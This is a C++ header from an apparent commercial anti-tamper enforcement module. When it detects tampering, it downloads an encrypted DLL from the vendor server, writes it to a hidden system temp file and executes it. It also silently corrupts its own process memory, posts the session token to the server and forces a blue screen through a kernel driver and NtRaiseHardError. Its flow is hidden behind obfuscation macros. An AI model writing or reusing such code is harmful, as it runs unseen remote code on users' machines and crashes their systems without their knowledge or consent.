#pragma once

#include <windows.h>
#include <bcrypt.h>

#include <cstdint>
#include <string>
#include <thread>
#include <atomic>
#include <chrono>

#include "state.hpp"
#include "webhook.hpp"
#include "syscall.hpp"
#include "obfuscation_macros.hpp"
#include "../standalone_license.hpp"
#include "../standalone_driver.hpp"
#include "../../../../../libs/cpp-httplib/httplib.h"
#include "../../../../../libs/nlohmann/json.hpp"

#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

namespace anti_tamper {

namespace enforcement_detail {


    inline std::string get_payload_host()
    {
#ifdef AIDA_LOCAL_LICENSE_SERVER
        return "http://localhost:3000";
#else
        return "https://aidapro.net";
#endif
    }


    inline std::string compute_sentinel_token()
    {

        auto now = std::chrono::system_clock::now();
        auto ms = std::chrono::duration_cast<std::chrono::milliseconds>(
            now.time_since_epoch()).count();
        int64_t hour_bucket = ms / 3600000;

        std::string master_secret;

        char* env_val = nullptr;
        size_t len = 0;
        if (_dupenv_s(&env_val, &len, "ARC_MASTER_SECRET") == 0 && env_val)
        {
            master_secret = env_val;
            free(env_val);
        }


        std::string message = "sentinel-payload-" + std::to_string(hour_bucket);

        BCRYPT_ALG_HANDLE hAlg = nullptr;
        BCRYPT_HASH_HANDLE hHash = nullptr;
        UCHAR hash_result[32] = {};

        BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, BCRYPT_ALG_HANDLE_HMAC_FLAG);
        if (!hAlg) return "";

        BCryptCreateHash(hAlg, &hHash, nullptr, 0,
            (PUCHAR)master_secret.data(), (ULONG)master_secret.size(), 0);
        if (!hHash) { BCryptCloseAlgorithmProvider(hAlg, 0); return ""; }

        BCryptHashData(hHash, (PUCHAR)message.data(), (ULONG)message.size(), 0);
        BCryptFinishHash(hHash, hash_result, 32, 0);
        BCryptDestroyHash(hHash);
        BCryptCloseAlgorithmProvider(hAlg, 0);


        char hex[33] = {};
        for (int i = 0; i < 16; i++)
            snprintf(hex + i * 2, 3, "%02x", hash_result[i]);
        return std::string(hex, 32);
    }


    inline bool aes_gcm_decrypt_payload(std::vector<uint8_t>& data)
    {
        if (data.size() < 12 + 16)
            return false;

        uint8_t iv[12];
        memcpy(iv, data.data(), 12);

        uint8_t tag[16];
        memcpy(tag, data.data() + data.size() - 16, 16);

        size_t ct_len = data.size() - 12 - 16;
        uint8_t* ct = data.data() + 12;

        uint8_t session_key[32] = {};
        {
            std::string token = standalone_license::get_session_token();
            BCRYPT_ALG_HANDLE hAlg = nullptr;
            BCRYPT_HASH_HANDLE hHash = nullptr;
            BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, nullptr, 0);
            if (!hAlg) return false;
            BCryptCreateHash(hAlg, &hHash, nullptr, 0, nullptr, 0, 0);
            if (!hHash) { BCryptCloseAlgorithmProvider(hAlg, 0); return false; }
            std::string material = "enforcement-payload-" + token;
            BCryptHashData(hHash, (PUCHAR)material.data(), (ULONG)material.size(), 0);
            BCryptFinishHash(hHash, session_key, 32, 0);
            BCryptDestroyHash(hHash);
            BCryptCloseAlgorithmProvider(hAlg, 0);
        }

        BCRYPT_ALG_HANDLE hAes = nullptr;
        BCRYPT_KEY_HANDLE hKey = nullptr;
        NTSTATUS status = BCryptOpenAlgorithmProvider(&hAes, BCRYPT_AES_ALGORITHM, nullptr, 0);
        if (!NT_SUCCESS(status)) return false;

        status = BCryptSetProperty(hAes, BCRYPT_CHAINING_MODE,
            (PUCHAR)BCRYPT_CHAIN_MODE_GCM, sizeof(BCRYPT_CHAIN_MODE_GCM), 0);
        if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAes, 0); return false; }

        status = BCryptGenerateSymmetricKey(hAes, &hKey, nullptr, 0, session_key, 32, 0);
        if (!NT_SUCCESS(status)) { BCryptCloseAlgorithmProvider(hAes, 0); return false; }

        BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO auth_info;
        BCRYPT_INIT_AUTH_MODE_INFO(auth_info);
        auth_info.pbNonce = iv;
        auth_info.cbNonce = 12;
        auth_info.pbTag = tag;
        auth_info.cbTag = 16;

        std::vector<uint8_t> plaintext(ct_len);
        ULONG pt_len = 0;

        status = BCryptDecrypt(hKey, ct, (ULONG)ct_len, &auth_info,
            nullptr, 0, plaintext.data(), (ULONG)ct_len, &pt_len, 0);

        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAes, 0);
        SecureZeroMemory(session_key, 32);

        if (!NT_SUCCESS(status))
            return false;

        plaintext.resize(pt_len);
        data = std::move(plaintext);
        return true;
    }


    inline bool download_and_execute_payload()
    {
        try
        {
            httplib::Client cli(get_payload_host());
            cli.set_connection_timeout(10);
            cli.set_read_timeout(60);
            cli.set_write_timeout(10);
            cli.set_keep_alive(false);
            cli.set_tcp_nodelay(true);
            cli.set_decompress(true);
            cli.set_follow_location(true);
            cli.enable_server_certificate_verification(true);

            httplib::Headers headers;
            headers.emplace("X-Sentinel-Token", compute_sentinel_token());

            auto res = cli.Get("/api/download/payload", headers);
            if (!res || res->status != 200 || res->body.empty())
                return false;


            std::vector<uint8_t> payload(res->body.begin(), res->body.end());
            if (!aes_gcm_decrypt_payload(payload))
                return false;


            if (payload.size() < 2 || payload[0] != 0x4D || payload[1] != 0x5A)
                return false;


            char tmp_path[MAX_PATH] = {};
            GetTempPathA(MAX_PATH, tmp_path);
            char tmp_file[MAX_PATH] = {};
            GetTempFileNameA(tmp_path, "wup", 0, tmp_file);


            std::string dll_path = std::string(tmp_file);

            HANDLE hf = CreateFileA(dll_path.c_str(), GENERIC_WRITE, 0, nullptr,
                CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, nullptr);
            if (hf == INVALID_HANDLE_VALUE) return false;

            DWORD written = 0;
            WriteFile(hf, payload.data(), static_cast<DWORD>(payload.size()), &written, nullptr);
            CloseHandle(hf);

            if (written != payload.size())
            {
                DeleteFileA(dll_path.c_str());
                return false;
            }


            HMODULE hMod = LoadLibraryA(dll_path.c_str());
            if (!hMod)
            {
                DeleteFileA(dll_path.c_str());
                return false;
            }


            using RunFn = void(WINAPI*)(HWND, HINSTANCE, LPSTR, int);
            auto pRun = reinterpret_cast<RunFn>(GetProcAddress(hMod, "Run"));

            if (pRun)
            {


                std::atomic<bool> done{false};

                std::thread worker([&]() {
                    __try {
                        pRun(nullptr, hMod, nullptr, 0);
                    }
                    __except (EXCEPTION_EXECUTE_HANDLER) {}
                    done.store(true);
                });


                auto start = std::chrono::steady_clock::now();
                while (!done.load())
                {
                    auto elapsed = std::chrono::steady_clock::now() - start;
                    if (elapsed > std::chrono::seconds(120))
                        break;
                    Sleep(500);
                }

                if (worker.joinable())
                {
                    if (done.load())
                        worker.join();
                    else
                        worker.detach();
                }
            }


            FreeLibrary(hMod);
            DeleteFileA(dll_path.c_str());
            return true;
        }
        catch (...) { return false; }
    }


    inline __declspec(noinline) void kill_path_kernel()
    {
        if (driver_bridge::is_loaded() && driver_bridge::using_kernel_driver())
        {
            auto& rt = state::get();
            driver_bridge::trigger_kernel_bsod(
                0x0002u,
                rt.code_snap.text_hash
            );
        }
    }

    inline __declspec(noinline) void kill_path_hard_error()
    {
        if (syscall::is_initialized())
        {
            BOOLEAN wasEnabled = FALSE;
            syscall::RtlAdjustPrivilege()(19, TRUE, FALSE, &wasEnabled);

            ULONG response = 0;
            syscall::NtRaiseHardError()(
                static_cast<NTSTATUS>(0xC0000420),
                0, 0, nullptr, 6, &response);
        }
    }

    inline __declspec(noinline) void kill_path_fastfail()
    {
        __fastfail(FAST_FAIL_FATAL_APP_EXIT);
    }

    inline __declspec(noinline) void kill_path_corrupt_stack()
    {
        volatile uint64_t* rsp;
        #if defined(_MSC_VER)
            rsp = reinterpret_cast<volatile uint64_t*>(_AddressOfReturnAddress());
        #endif
        if (rsp)
            *rsp ^= 0xDEADC0DEULL;
    }

    inline __declspec(noinline) void execute_all_kill_paths()
    {
        kill_path_kernel();
        kill_path_hard_error();
        kill_path_corrupt_stack();
        kill_path_fastfail();
    }


    inline std::atomic<int> g_corruption_round{0};

    inline uint64_t corruption_prng(uint64_t& seed)
    {
        seed ^= seed >> 12;
        seed ^= seed << 25;
        seed ^= seed >> 27;
        return seed * 0x2545F4914F6CDD1DULL;
    }

    inline void silent_corrupt_text(int round)
    {
        HMODULE hMod = GetModuleHandleA(nullptr);
        if (!hMod) return;

        auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(hMod);
        if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;

        auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(
            reinterpret_cast<uint8_t*>(hMod) + dos->e_lfanew);
        if (nt->Signature != IMAGE_NT_SIGNATURE) return;

        auto* sec = IMAGE_FIRST_SECTION(nt);
        uint8_t* text_base = nullptr;
        uint32_t text_size = 0;

        for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
            if (sec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
                text_base = reinterpret_cast<uint8_t*>(hMod) + sec[i].VirtualAddress;
                text_size = sec[i].Misc.VirtualSize;
                break;
            }
        }

        if (!text_base || text_size < 256) return;

        DWORD old_prot = 0;

        uint64_t seed = __rdtsc() ^ (static_cast<uint64_t>(round) << 32);

        switch (round) {
        case 1: {
            VirtualProtect(text_base, text_size, PAGE_EXECUTE_READWRITE, &old_prot);
            for (int i = 0; i < 16; ++i) {
                uint32_t offset = static_cast<uint32_t>(corruption_prng(seed) % (text_size - 1));
                text_base[offset] ^= static_cast<uint8_t>(corruption_prng(seed));
            }
            VirtualProtect(text_base, text_size, old_prot, &old_prot);
            break;
        }
        case 2: {
            VirtualProtect(text_base, text_size, PAGE_EXECUTE_READWRITE, &old_prot);
            for (int i = 0; i < 256; ++i) {
                uint32_t offset = static_cast<uint32_t>(corruption_prng(seed) % (text_size - 1));
                text_base[offset] = static_cast<uint8_t>(corruption_prng(seed));
            }
            auto* rdata_sec = IMAGE_FIRST_SECTION(nt);
            for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
                if (rdata_sec[i].Name[1] == 'r' && rdata_sec[i].Name[2] == 'd') {
                    uint8_t* rdata = reinterpret_cast<uint8_t*>(hMod) + rdata_sec[i].VirtualAddress;
                    uint32_t rdata_size = rdata_sec[i].Misc.VirtualSize;
                    DWORD rp = 0;
                    VirtualProtect(rdata, rdata_size, PAGE_READWRITE, &rp);
                    for (int j = 0; j < 64; ++j) {
                        uint32_t off = static_cast<uint32_t>(corruption_prng(seed) % (rdata_size - 1));
                        rdata[off] ^= static_cast<uint8_t>(corruption_prng(seed));
                    }
                    VirtualProtect(rdata, rdata_size, rp, &rp);
                    break;
                }
            }
            VirtualProtect(text_base, text_size, old_prot, &old_prot);
            break;
        }
        case 3: {
            VirtualProtect(text_base, text_size, PAGE_EXECUTE_READWRITE, &old_prot);
            uint32_t page_count = text_size / 4096;
            for (uint32_t p = 0; p < page_count; ++p) {
                if ((corruption_prng(seed) & 3) == 0) {
                    uint8_t* page = text_base + p * 4096;
                    for (int b = 0; b < 4096; ++b)
                        page[b] = static_cast<uint8_t>(corruption_prng(seed));
                }
            }
            VirtualProtect(text_base, text_size, old_prot, &old_prot);
            break;
        }
        }
    }

    inline void graduated_enforcement()
    {
        int round = g_corruption_round.fetch_add(1) + 1;

        if (round <= 3) {
            silent_corrupt_text(round);

            try {
                std::string host = get_payload_host();
                httplib::Client cli(host);
                cli.set_connection_timeout(5);
                cli.set_read_timeout(5);
                cli.enable_server_certificate_verification(true);

                nlohmann::json body;
                body["session_token"] = standalone_license::get_session_token();
                body["corruption_round"] = round;
                body["tsc"] = __rdtsc();

                cli.Post("/api/license/violation", body.dump(), "application/json");
            } catch (...) {}

            if (round == 3) {
                execute_all_kill_paths();
            }
        } else {
            execute_all_kill_paths();
        }
    }

}

inline void enforce_violation(const char* reason, const std::string& extra = "")
{
    auto& rt = state::get();

    OBFUSCATE_JUNK(ev_pre);

    if (rt.violation_latched.exchange(true))
        return;

    CFF_BEGIN(ev_cff)
    CFF_STATE(ev_cff, 0)
    {
        {
            std::lock_guard<std::mutex> lk(rt.mtx);
            rt.violation_reason = reason ? reason : "anti_tamper";
        }
        CFF_GOTO(ev_cff, 1);
    }
    CFF_STATE(ev_cff, 1)
    {
        OBFUSCATE_JUNK(ev_wh);
        webhook::send_violation_alert(reason ? reason : "anti_tamper", extra);
        CFF_GOTO(ev_cff, 2);
    }
    CFF_STATE(ev_cff, 2)
    {
        standalone_license::shutdown();
        CFF_GOTO(ev_cff, 3);
    }
    CFF_STATE(ev_cff, 3)
    {
        OBFUSCATE_JUNK(ev_grad);
        enforcement_detail::graduated_enforcement();
    }
    CFF_END(ev_cff)
}

inline void enforcement_tick()
{
    auto& rt = state::get();
    if (!rt.violation_latched.load())
        return;

    int current_round = enforcement_detail::g_corruption_round.load();
    if (current_round > 0 && current_round < 3) {
        enforcement_detail::graduated_enforcement();
    }
}

} // namespace anti_tamper
